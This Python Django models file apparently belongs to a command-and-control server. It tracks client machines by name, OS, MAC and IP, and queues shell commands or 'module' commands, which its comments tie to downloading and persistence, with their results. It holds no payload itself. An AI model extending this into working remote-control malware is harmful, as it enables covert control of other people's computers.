from uuid import uuid4

from django.db import models
from django.template.defaultfilters import truncatechars


class Client(models.Model):
    uuid = models.UUIDField(default=uuid4)
    computer_name = models.CharField(max_length=255)
    os = models.CharField(max_length=255)
    mac = models.CharField(max_length=17,)

    last_ip = models.GenericIPAddressField()
    last_online = models.DateTimeField(null=True, blank=True)

    created_on = models.DateTimeField(auto_now_add=True)
    updated_on = models.DateTimeField(auto_now=True)

    def __str__(self):
        return ("%s %s" % (self.computer_name, self.os)).strip()

    class Meta:
        verbose_name = "Client"
        verbose_name_plural = "Clients"


class Command(models.Model):
    uuid = models.UUIDField(default=uuid4)
    client = models.ForeignKey(Client, on_delete=models.CASCADE)

    SHELL_COMMAND = 0  # will run as a cmd command
    MODULE_COMMAND = 1  # for internal functions such as downloader or persistence

    COMMAND_TYPE_CHOICES = (
        (SHELL_COMMAND, 'Shell command'),
        (MODULE_COMMAND, 'Module command'),
    )
    command_type = models.IntegerField(default=COMMAND_TYPE_CHOICES[0][0], choices=COMMAND_TYPE_CHOICES)
    command = models.TextField()

    received = models.BooleanField(default=False)

    created_on = models.DateTimeField(auto_now_add=True)
    updated_on = models.DateTimeField(auto_now=True)

    def __str__(self):
        return "%s" % self.uuid


class CommandResult(models.Model):
    command = models.ForeignKey(Command, on_delete=models.CASCADE, editable=False)
    result = models.TextField(null=True, blank=True, editable=False)
    has_error = models.BooleanField(default=False, editable=False)

    created_on = models.DateTimeField(auto_now_add=True, editable=False)

    def __str__(self):
        return "%s" % truncatechars(self.command.command, 100)
